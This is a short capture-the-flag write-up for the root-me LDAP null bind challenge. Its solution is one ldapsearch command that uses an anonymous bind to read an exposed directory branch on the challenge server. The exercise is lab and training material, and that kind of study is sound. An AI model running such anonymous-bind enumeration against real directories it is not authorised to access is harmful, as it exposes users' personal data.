# LDAP null bind

[root-me challenge LDAP - null bind](https://www.root-me.org/en/Challenges/Network/LDAP-null-bind): It seems that one of the anonymous created a new branch in the LDAP directory, somewhere in:

    dc=challenge01,dc=root-me,dc=org

Get access to its data and get his email adress.

----

```text
ldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "ldap://challenge01.root-me.org:54013"
```

## Resources

* [rfc4512](https://repository.root-me.org/RFC/EN%20-%20rfc4512.txt)
* [rfc4513](https://repository.root-me.org/RFC/EN%20-%20rfc4513.txt)
